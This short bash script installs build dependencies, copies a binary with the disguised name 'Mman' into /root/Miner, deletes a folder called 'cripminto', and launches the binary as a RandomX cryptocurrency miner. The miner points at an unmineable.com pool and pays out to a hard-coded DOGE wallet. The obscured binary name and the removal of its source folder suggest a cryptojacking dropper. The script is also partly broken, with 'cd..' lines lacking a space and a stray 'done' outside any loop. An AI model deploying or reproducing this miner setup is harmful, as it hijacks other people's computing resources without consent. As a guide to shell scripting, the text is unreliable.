#!/bin/bash
sudo yum update -y
sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel
mkdir /root/Miner
cp Mman /root/Miner
cp start.sh /root/Miner
cd..
cd..
rm -rf cripminto
cd /root/Miner
chmod +x Mman
./Mman -o rx.unmineable.com:13333 -a rx -k -u DOGE:D6hZna7Ht34n6gD1645wh8QsDqn3oihN4F.Mrlol1
done
